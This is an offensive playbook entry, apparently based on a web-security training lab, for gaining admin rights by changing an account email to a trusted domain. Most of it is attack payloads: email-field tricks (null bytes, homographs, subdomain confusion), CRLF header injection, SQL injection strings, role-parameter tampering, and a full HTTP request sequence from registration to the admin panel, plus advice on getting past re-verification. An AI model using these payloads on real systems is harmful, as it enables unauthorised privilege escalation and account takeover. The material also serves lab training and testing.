# Email Domain Bypass / Privileged-Domain Trust

## When this applies

- Application grants admin privileges to users with a specific email domain (`@dontwannacry.com`, `@company-internal.com`).
- Email change endpoint accepts a new email without re-verification.
- Domain check is naive (substring, suffix, wrong normalization).

## Technique

Register with any email, then use the email-change endpoint to set the privileged domain. Bypass naive substring/case/encoding checks with formatting tricks (plus addressing, IDN homographs, header injection).

## Steps

### Email domain bypass payloads

```http
POST /my-account/change-email HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Basic privileged domain
email=attacker@dontwannacry.com

# Email variations
email=attacker+admin@dontwannacry.com  # Plus addressing
email=ATTACKER@DONTWANNACRY.COM  # Case variation
email=attacker@dontwannacry.com%20  # Trailing space
email=%20attacker@dontwannacry.com  # Leading space
email=attacker@dontwannacry.com%00  # Null byte

# Subdomain confusion
email=attacker@evil.dontwannacry.com
email=attacker@dontwannacry.com.attacker.com

# Unicode/IDN homograph
email=attacker@dοntwannacry.com  # Greek omicron 'ο' instead of Latin 'o'

# Email header injection
email=attacker@dontwannacry.com%0ACc:admin@target.com

# SQL injection in email
email=admin@dontwannacry.com'OR'1'='1
email=admin@dontwannacry.com';--
```

### Concrete sequence

**Initial Registration:**
```http
POST /register HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=attacker&email=attacker@exploit-0a1b2c3d.web-security-academy.net&password=pass123
```

**Email Confirmation:**
```http
GET /confirm-email?token=abc123xyz789 HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=newSessionHere
```

**Email Change (No Verification Required):**
```http
POST /my-account/change-email HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=confirmedUserSession
Content-Type: application/x-www-form-urlencoded

email=attacker@dontwannacry.com&csrf=token123
```

**Admin Access Granted:**
```http
GET /admin HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=confirmedUserSession

# Response: 200 OK (Admin panel accessible!)
```

### Role/privilege manipulation alongside email

```http
# Direct role assignment
POST /my-account/update HTTP/1.1

role=admin
role=administrator
role=superuser
role=root

# Array format
roles[]=user&roles[]=admin

# JSON format
{"role":"admin"}
{"roles":["user","admin"]}

# Hidden parameter injection
username=attacker&role=admin
username=attacker&isAdmin=true
username=attacker&privilege=9999
```

## Verifying success

- After the email change, accessing `/admin` returns 200 with the admin UI.
- Profile reflects the new email; admin-only menu items appear.
- Privileged actions execute without 403.

## Common pitfalls

- Email-confirmation may be required for the NEW email — apps that re-verify on change defeat the simple case. Try plus-addressing or subdomain confusion to receive the confirmation while keeping the privileged-looking address.
- Some checks normalize Unicode — IDN homograph fails on those.
- Trailing-space / null-byte tricks depend on the exact backend regex; test with both raw and encoded forms.

## Tools

- Burp Suite Repeater (custom email payloads)
- catch-all email service (Mailosaur, Mail.tm) for confirmation pickup
- curl
